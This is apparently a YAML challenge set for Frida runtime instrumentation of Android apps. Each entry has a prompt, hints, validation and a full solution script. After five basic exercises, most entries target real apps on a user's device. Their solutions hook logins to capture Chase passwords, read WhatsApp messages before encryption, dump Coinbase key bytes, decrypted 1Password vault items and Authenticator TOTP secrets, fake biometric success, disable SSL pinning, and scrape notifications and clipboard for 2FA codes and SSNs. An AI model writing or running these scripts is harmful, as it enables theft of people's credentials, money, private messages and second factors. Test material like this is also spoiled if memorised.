# Green Belt Challenges
# Purpose: Dynamic Instrumentation and Runtime Analysis
# Focus: Using Frida to intercept, modify, and analyze app behavior in real-time

challenges:
  # Challenge 1: Process Verification (Placeholder already exists but let's formalize)
  - id: green_001
    name: "Frida Runtime Check"
    description: |
      Write a basic Frida script that prints "Frida is active" to the console 
      and then exits. Use this to verify the runtime environment.
    belt: green
    difficulty: 1
    script_type: frida

    inputs:
      target_class: "com.genymotion.settings"
      device_context:
        task: "verify frida connectivity"

    validation:
      type: output_contains
      expected: "Frida is active"

    hints:
      - "Use console.log() for output"
      - "The script should be pure JavaScript"

    kata_solution: "console.log('Frida is active');"

    tags:
      - frida
      - verification

  # Challenge 2: Class Enumeration
  - id: green_002
    name: "Class & Method Enumeration"
    description: |
      Write a Frida script that enumerates all loaded classes in the 
      target process and prints their names to the console.
    belt: green
    difficulty: 2
    script_type: frida

    inputs:
      target_class: "com.genymotion.settings"
      device_context:
        task: "enumerate loaded classes"

    validation:
      type: output_contains
      expected: "java.lang.String"

    hints:
      - "Use Java.enumerateLoadedClasses() logic"
      - "Iterate through the array and log each class name"

    kata_solution: |
      Java.perform(function() {
          Java.enumerateLoadedClasses({
              onMatch: function(className) {
                  console.log(className);
              },
              onComplete: function() {
                  console.log("Enumeration complete");
              }
          });
      });

    tags:
      - reconnaissance
      - frida
      - enumeration

  # Challenge 3: API Hooking (Logging)
  - id: green_003
    name: "System Log Interception"
    description: |
      Write a Frida script that hooks the android.util.Log.d method 
      and prints every log message to the Frida console.
    belt: green
    difficulty: 3
    script_type: frida

    inputs:
      target_class: "android.util.Log"
      device_context:
        task: "intercept debug logs"

    validation:
      type: regex_match
      pattern: "\\.implementation = function"

    hints:
      - "Use Java.use('android.util.Log')"
      - "Overwrite the .d.implementation function"
      - "Remember to call the original method if you want logs to still appear in logcat"

    kata_solution: |
      Java.perform(function() {
          var Log = Java.use("android.util.Log");
          Log.d.overload("java.lang.String", "java.lang.String").implementation = function(tag, msg) {
              console.log("[INTERCEPTED] Tag: " + tag + " Message: " + msg);
              return this.d(tag, msg);
          };
      });

    tags:
      - frida
      - hooking
      - logging

  # Challenge 4: Root Detection Bypass
  - id: green_004
    name: "Root Detection Logic Bypass"
    description: |
      An app has a method 'checkRoot' in class 'com.security.check' that 
      returns 'true' if the device is rooted. Write a Frida script to 
      force this method to always return 'false'.
    belt: green
    difficulty: 4
    script_type: frida

    inputs:
      target_class: "com.security.check"
      device_context:
        task: "bypass root check"

    validation:
      type: output_contains
      expected: "return false"

    hints:
      - "Hook the specific method implementation"
      - "Ignore the original logic and simply return false"

    kata_solution: |
      Java.perform(function() {
          var RootCheck = Java.use("com.security.check");
          RootCheck.checkRoot.implementation = function() {
              console.log("Bypassing root check...");
              return false;
          };
      });

    tags:
      - frida
      - bypass
      - root-detection

  # Challenge 5: Native Function Interception
  - id: green_005
    name: "Native File Open Interception"
    description: |
      Write a Frida script that hooks the native 'open' function in 
      libc.so and logs the name of every file the process attempts to open.
    belt: green
    difficulty: 5
    script_type: frida

    inputs:
      target_class: "libc.so"
      device_context:
        task: "monitor native file access"

    validation:
      type: output_contains
      expected: "Interceptor.attach"

    hints:
      - "Use Module.findExportByName(null, 'open')"
      - "Use Interceptor.attach with onEnter callback"
      - "The first argument (args[0]) is the path string"

    kata_solution: |
      var openPtr = Module.findExportByName(null, 'open');
      Interceptor.attach(openPtr, {
          onEnter: function(args) {
              var path = Memory.readUtf8String(args[0]);
              console.log("[OPEN] File: " + path);
          }
      });

    tags:
      - frida
      - native
      - interceptor

  # =============================================================================
  # PERSONA-AWARE APP TARGETING CHALLENGES
  # =============================================================================
  # These challenges target specific apps from the device persona

  # Challenge 6: Banking App Credential Hooking
  - id: green_persona_001
    name: "Banking App Login Hook"
    description: |
      The target device has Chase Mobile installed (com.chase.sig.android).
      Write a Frida script that hooks the login flow to capture credentials
      when the user authenticates. Focus on intercepting the authentication
      method that processes username and password.
    belt: green
    difficulty: 5
    script_type: frida
    compatibility: universal

    persona_requirements:
      required_apps:
        - com.chase.sig.android

    inputs:
      target_package: "com.chase.sig.android"
      device_context:
        task: "intercept banking credentials"
        target_app: "Chase Mobile"

    validation:
      type: regex_match
      pattern: "Java\\.use.*implementation.*function"

    hints:
      - "First enumerate classes to find authentication-related methods"
      - "Look for methods with 'login', 'auth', or 'credential' in the name"
      - "Hook String parameters passed to authentication methods"
      - "Use Java.choose() to find existing instances if needed"

    kata_solution: |
      Java.perform(function() {
          // Generic pattern for credential interception
          Java.enumerateLoadedClasses({
              onMatch: function(className) {
                  if (className.toLowerCase().includes("login") ||
                      className.toLowerCase().includes("auth")) {
                      console.log("[TARGET] Found class: " + className);
                  }
              },
              onComplete: function() {}
          });

          // Hook common authentication patterns
          try {
              var LoginActivity = Java.use("com.chase.sig.android.activity.LoginActivity");
              LoginActivity.doLogin.implementation = function(username, password) {
                  console.log("[CAPTURED] Username: " + username);
                  console.log("[CAPTURED] Password: " + password);
                  return this.doLogin(username, password);
              };
          } catch(e) {
              console.log("Searching for alternative auth methods...");
          }
      });

    tags:
      - frida
      - credential-theft
      - banking
      - persona-required

  # Challenge 7: Messaging App Message Interception
  - id: green_persona_002
    name: "WhatsApp Message Interception"
    description: |
      The device has WhatsApp installed. Write a Frida script that hooks
      WhatsApp's message handling to intercept outgoing messages before
      they're encrypted and sent. Log the recipient and message content.
    belt: green
    difficulty: 5
    script_type: frida
    compatibility: universal

    persona_requirements:
      required_apps:
        - com.whatsapp

    inputs:
      target_package: "com.whatsapp"
      device_context:
        task: "intercept messaging content"
        target_app: "WhatsApp"

    validation:
      type: output_contains
      expected: "Java.perform"

    hints:
      - "WhatsApp uses end-to-end encryption, but messages exist in plaintext before encryption"
      - "Look for message composition or send methods"
      - "The Message class likely has getText() or similar methods"
      - "Hook at the UI layer before encryption occurs"

    kata_solution: |
      Java.perform(function() {
          // Hook message sending at UI layer
          try {
              var MessageSender = Java.use("com.whatsapp.messaging.MessageSender");
              MessageSender.sendTextMessage.implementation = function(recipient, message) {
                  console.log("[INTERCEPTED] To: " + recipient);
                  console.log("[INTERCEPTED] Message: " + message);
                  return this.sendTextMessage(recipient, message);
              };
          } catch(e) {
              console.log("Trying alternative hook point...");
          }

          // Alternative: Hook at EditText level
          var EditText = Java.use("android.widget.EditText");
          EditText.getText.implementation = function() {
              var text = this.getText();
              console.log("[INPUT] " + text.toString());
              return text;
          };
      });

    tags:
      - frida
      - message-interception
      - e2e-bypass
      - persona-required

  # Challenge 8: Cryptocurrency Wallet Key Extraction
  - id: green_persona_003
    name: "Crypto Wallet Key Extraction"
    description: |
      The device has Coinbase installed (com.coinbase.android). Write a
      Frida script that attempts to extract wallet keys or seed phrases
      by hooking cryptographic operations and key management classes.
    belt: green
    difficulty: 5
    script_type: frida
    compatibility: android_14

    persona_requirements:
      required_apps:
        - com.coinbase.android

    inputs:
      target_package: "com.coinbase.android"
      device_context:
        task: "extract cryptocurrency keys"
        target_app: "Coinbase"

    validation:
      type: regex_match
      pattern: "(SecretKey|PrivateKey|KeyPair|seed|mnemonic)"

    hints:
      - "Look for java.security.KeyStore operations"
      - "Hook SecretKeySpec constructor to capture key material"
      - "Seed phrases are often stored as String arrays"
      - "Check for BIP39 mnemonic generation methods"

    kata_solution: |
      Java.perform(function() {
          // Hook KeyStore operations
          var KeyStore = Java.use("java.security.KeyStore");
          KeyStore.getKey.implementation = function(alias, password) {
              console.log("[KEYSTORE] Alias: " + alias);
              var key = this.getKey(alias, password);
              if (key != null) {
                  console.log("[KEYSTORE] Key retrieved!");
              }
              return key;
          };

          // Hook SecretKeySpec for symmetric keys
          var SecretKeySpec = Java.use("javax.crypto.spec.SecretKeySpec");
          SecretKeySpec.$init.overload('[B', 'java.lang.String').implementation = function(key, algo) {
              console.log("[SECRET KEY] Algorithm: " + algo);
              console.log("[SECRET KEY] Key bytes: " + bytesToHex(key));
              return this.$init(key, algo);
          };

          function bytesToHex(bytes) {
              var hex = [];
              for (var i = 0; i < bytes.length; i++) {
                  hex.push(('0' + (bytes[i] & 0xFF).toString(16)).slice(-2));
              }
              return hex.join('');
          }
      });

    tags:
      - frida
      - crypto-theft
      - key-extraction
      - persona-required

  # Challenge 9: Password Manager Vault Access
  - id: green_persona_004
    name: "Password Manager Vault Hook"
    description: |
      The device has 1Password installed (com.onepassword.android). Write
      a Frida script that hooks the vault decryption process to capture
      the master password or extract decrypted credentials as they're used.
    belt: green
    difficulty: 5
    script_type: frida
    compatibility: android_14

    persona_requirements:
      required_apps:
        - com.onepassword.android

    inputs:
      target_package: "com.onepassword.android"
      device_context:
        task: "extract password vault contents"
        target_app: "1Password"

    validation:
      type: output_contains
      expected: "implementation"

    hints:
      - "Hook the unlock/decrypt method that takes the master password"
      - "Look for Cipher.doFinal() calls during decryption"
      - "Credential filling methods expose plaintext passwords"
      - "The autofill service is a good hook point"

    kata_solution: |
      Java.perform(function() {
          // Hook master password entry
          var EditText = Java.use("android.widget.EditText");

          // Hook Cipher operations
          var Cipher = Java.use("javax.crypto.Cipher");
          Cipher.doFinal.overload('[B').implementation = function(input) {
              var result = this.doFinal(input);
              console.log("[CIPHER] Decrypted data length: " + result.length);
              try {
                  var str = Java.use("java.lang.String").$new(result, "UTF-8");
                  console.log("[DECRYPTED] " + str.substring(0, Math.min(100, str.length())));
              } catch(e) {}
              return result;
          };

          // Hook autofill credential retrieval
          try {
              var CredentialProvider = Java.use("com.onepassword.android.autofill.CredentialProvider");
              CredentialProvider.getCredential.implementation = function(id) {
                  var cred = this.getCredential(id);
                  console.log("[CREDENTIAL] ID: " + id);
                  console.log("[CREDENTIAL] Username: " + cred.getUsername());
                  console.log("[CREDENTIAL] Password: " + cred.getPassword());
                  return cred;
              };
          } catch(e) {}
      });

    tags:
      - frida
      - password-theft
      - vault-bypass
      - persona-required

  # Challenge 10: 2FA Token Extraction
  - id: green_persona_005
    name: "Authenticator TOTP Extraction"
    description: |
      The device has Google Authenticator installed. Write a Frida script
      that extracts the TOTP secrets used to generate 2FA codes, allowing
      code generation without access to the app.
    belt: green
    difficulty: 5
    script_type: frida
    compatibility: universal

    persona_requirements:
      required_apps:
        - com.google.android.apps.authenticator2

    inputs:
      target_package: "com.google.android.apps.authenticator2"
      device_context:
        task: "extract 2FA secrets"
        target_app: "Google Authenticator"

    validation:
      type: regex_match
      pattern: "(TOTP|secret|generateCode|OTP)"

    hints:
      - "TOTP secrets are Base32-encoded strings"
      - "Look for database operations storing account info"
      - "The code generation method takes the secret as input"
      - "SQLite database may contain the secrets"

    kata_solution: |
      Java.perform(function() {
          // Hook TOTP generation
          try {
              var OtpProvider = Java.use("com.google.android.apps.authenticator2.otp.OtpProvider");
              OtpProvider.getNextCode.implementation = function(secret) {
                  console.log("[TOTP SECRET] " + secret);
                  return this.getNextCode(secret);
              };
          } catch(e) {}

          // Hook database queries for stored secrets
          var SQLiteDatabase = Java.use("android.database.sqlite.SQLiteDatabase");
          SQLiteDatabase.rawQuery.implementation = function(sql, args) {
              console.log("[SQL] " + sql);
              if (sql.toLowerCase().includes("accounts") ||
                  sql.toLowerCase().includes("secret")) {
                  console.log("[POTENTIAL SECRET QUERY]");
              }
              return this.rawQuery(sql, args);
          };
      });

    tags:
      - frida
      - 2fa-bypass
      - totp-extraction
      - persona-required

  # Challenge 11: Biometric Bypass
  - id: green_persona_006
    name: "Biometric Authentication Bypass"
    description: |
      Many apps on the device use biometric authentication (fingerprint).
      Write a Frida script that bypasses biometric checks by hooking the
      BiometricPrompt callback and forcing successful authentication.
    belt: green
    difficulty: 4
    script_type: frida
    compatibility: universal

    inputs:
      device_context:
        task: "bypass biometric authentication"

    validation:
      type: output_contains
      expected: "BiometricPrompt"

    hints:
      - "Hook BiometricPrompt.AuthenticationCallback"
      - "Force onAuthenticationSucceeded to be called"
      - "You may need to create a fake AuthenticationResult"
      - "Some apps also check FingerprintManager (deprecated API)"

    kata_solution: |
      Java.perform(function() {
          var BiometricPrompt = Java.use("android.hardware.biometrics.BiometricPrompt");
          var AuthCallback = Java.use("android.hardware.biometrics.BiometricPrompt$AuthenticationCallback");

          AuthCallback.onAuthenticationFailed.implementation = function() {
              console.log("[BIOMETRIC] Failed attempt intercepted");
              // Don't call original - suppress failure
          };

          // Force success on any authentication attempt
          BiometricPrompt.authenticate.overload(
              'android.os.CancellationSignal',
              'java.util.concurrent.Executor',
              'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback'
          ).implementation = function(cancel, executor, callback) {
              console.log("[BIOMETRIC] Authentication requested - forcing success");

              // Create fake success result
              var AuthResult = Java.use("android.hardware.biometrics.BiometricPrompt$AuthenticationResult");
              var fakeResult = AuthResult.$new();

              callback.onAuthenticationSucceeded(fakeResult);
          };
      });

    tags:
      - frida
      - biometric-bypass
      - authentication
      - persona-required

  # Challenge 12: SSL Pinning Bypass
  - id: green_persona_007
    name: "SSL Certificate Pinning Bypass"
    description: |
      Banking and financial apps (Chase, Coinbase) use SSL pinning to
      prevent traffic interception. Write a Frida script that bypasses
      SSL pinning to allow MITM analysis of HTTPS traffic.
    belt: green
    difficulty: 4
    script_type: frida
    compatibility: universal

    inputs:
      device_context:
        task: "bypass SSL certificate pinning"
        target_apps:
          - "com.chase.sig.android"
          - "com.coinbase.android"

    validation:
      type: regex_match
      pattern: "(TrustManager|checkServerTrusted|SSLContext)"

    hints:
      - "Hook X509TrustManager.checkServerTrusted"
      - "Make it accept any certificate chain"
      - "Also hook OkHttp's CertificatePinner if used"
      - "Some apps use custom pinning implementations"

    kata_solution: |
      Java.perform(function() {
          // Bypass standard TrustManager
          var TrustManager = Java.use("javax.net.ssl.X509TrustManager");
          var SSLContext = Java.use("javax.net.ssl.SSLContext");

          var TrustManagerImpl = Java.registerClass({
              name: 'com.bypass.TrustManager',
              implements: [TrustManager],
              methods: {
                  checkClientTrusted: function(chain, authType) {},
                  checkServerTrusted: function(chain, authType) {
                      console.log("[SSL BYPASS] Accepting certificate for: " + authType);
                  },
                  getAcceptedIssuers: function() { return []; }
              }
          });

          // Install our TrustManager
          var context = SSLContext.getInstance("TLS");
          context.init(null, [TrustManagerImpl.$new()], null);
          SSLContext.setDefault(context);

          // Bypass OkHttp pinning
          try {
              var CertPinner = Java.use("okhttp3.CertificatePinner");
              CertPinner.check.overload('java.lang.String', 'java.util.List').implementation = function(hostname, certs) {
                  console.log("[OKHTTP] Bypassing pin for: " + hostname);
                  return;
              };
          } catch(e) {}

          console.log("[SSL] Pinning bypass installed");
      });

    tags:
      - frida
      - ssl-bypass
      - mitm
      - persona-required

  # Challenge 13: App-Specific Data Extraction
  - id: green_persona_008
    name: "Chat App Database Extraction"
    description: |
      WhatsApp and Telegram store messages in encrypted SQLite databases.
      Write a Frida script that hooks database operations to extract
      decrypted message content as the app reads them.
    belt: green
    difficulty: 5
    script_type: frida
    compatibility: universal

    persona_requirements:
      required_apps:
        - com.whatsapp

    inputs:
      target_package: "com.whatsapp"
      device_context:
        task: "extract messaging database content"
        target_app: "WhatsApp"

    validation:
      type: output_contains
      expected: "SQLite"

    hints:
      - "Hook SQLiteCursor to capture query results"
      - "WhatsApp's msgstore.db contains all messages"
      - "Messages are decrypted when loaded into memory"
      - "Hook getString() on Cursor to capture text columns"

    kata_solution: |
      Java.perform(function() {
          var Cursor = Java.use("android.database.Cursor");
          var SQLiteCursor = Java.use("android.database.sqlite.SQLiteCursor");

          // Hook getString to capture message content
          Cursor.getString.implementation = function(columnIndex) {
              var value = this.getString(columnIndex);
              var colName = this.getColumnName(columnIndex);

              // Look for message-related columns
              if (colName && (colName.includes("data") ||
                             colName.includes("text") ||
                             colName.includes("body"))) {
                  console.log("[DB] Column: " + colName + " = " + value);
              }
              return value;
          };

          // Hook rawQuery to see what's being queried
          var SQLiteDatabase = Java.use("android.database.sqlite.SQLiteDatabase");
          SQLiteDatabase.rawQuery.implementation = function(sql, args) {
              if (sql.toLowerCase().includes("message")) {
                  console.log("[SQL] Message query: " + sql);
              }
              return this.rawQuery(sql, args);
          };
      });

    tags:
      - frida
      - database-extraction
      - message-theft
      - persona-required

  # Challenge 14: Notification Content Interception
  - id: green_persona_009
    name: "Notification Content Theft"
    description: |
      Many sensitive items arrive via notifications (2FA codes, bank alerts).
      Write a Frida script that intercepts all notifications as they're
      posted, extracting the title and content text.
    belt: green
    difficulty: 3
    script_type: frida
    compatibility: universal

    inputs:
      device_context:
        task: "intercept notification content"

    validation:
      type: output_contains
      expected: "NotificationManager"

    hints:
      - "Hook NotificationManager.notify()"
      - "Extract text from Notification.extras Bundle"
      - "Keys: EXTRA_TITLE, EXTRA_TEXT, EXTRA_BIG_TEXT"
      - "2FA codes often come as high-priority notifications"

    kata_solution: |
      Java.perform(function() {
          var NotificationManager = Java.use("android.app.NotificationManager");
          var Notification = Java.use("android.app.Notification");

          NotificationManager.notify.overload('int', 'android.app.Notification').implementation = function(id, notification) {
              console.log("[NOTIFICATION] ID: " + id);

              var extras = notification.extras.value;
              var title = extras.getString("android.title");
              var text = extras.getString("android.text");
              var bigText = extras.getString("android.bigText");

              console.log("[NOTIFICATION] Title: " + title);
              console.log("[NOTIFICATION] Text: " + text);
              if (bigText) console.log("[NOTIFICATION] BigText: " + bigText);

              // Check for 2FA codes
              var fullText = (text || "") + (bigText || "");
              if (fullText.match(/\d{6}/) || fullText.toLowerCase().includes("code")) {
                  console.log("[2FA DETECTED] Potential verification code!");
              }

              return this.notify(id, notification);
          };
      });

    tags:
      - frida
      - notification-interception
      - 2fa-theft
      - persona-required

  # Challenge 15: Clipboard Monitoring
  - id: green_persona_010
    name: "Real-time Clipboard Monitoring"
    description: |
      Users often copy sensitive data (passwords, crypto addresses).
      Write a Frida script that monitors the system clipboard and logs
      everything that's copied, looking for high-value data patterns.
    belt: green
    difficulty: 3
    script_type: frida
    compatibility: universal

    inputs:
      device_context:
        task: "monitor clipboard for sensitive data"

    validation:
      type: output_contains
      expected: "ClipboardManager"

    hints:
      - "Hook ClipboardManager.setPrimaryClip()"
      - "Extract text from ClipData items"
      - "Look for patterns: crypto addresses, passwords, SSNs"
      - "Also hook getText() for reading clipboard"

    kata_solution: |
      Java.perform(function() {
          var ClipboardManager = Java.use("android.content.ClipboardManager");
          var ClipData = Java.use("android.content.ClipData");

          // Hook clipboard write
          ClipboardManager.setPrimaryClip.implementation = function(clip) {
              console.log("[CLIPBOARD] New content copied");

              for (var i = 0; i < clip.getItemCount(); i++) {
                  var item = clip.getItemAt(i);
                  var text = item.getText();
                  if (text) {
                      console.log("[CLIPBOARD] Content: " + text);

                      // Pattern matching for sensitive data
                      var str = text.toString();
                      if (str.match(/^0x[a-fA-F0-9]{40}$/)) {
                          console.log("[ALERT] Ethereum address detected!");
                      }
                      if (str.match(/^\d{3}-\d{2}-\d{4}$/)) {
                          console.log("[ALERT] SSN pattern detected!");
                      }
                      if (str.match(/^[A-Za-z0-9+/]{20,}={0,2}$/)) {
                          console.log("[ALERT] Possible API key/token!");
                      }
                  }
              }

              return this.setPrimaryClip(clip);
          };
      });

    tags:
      - frida
      - clipboard-monitor
      - data-theft
      - persona-required

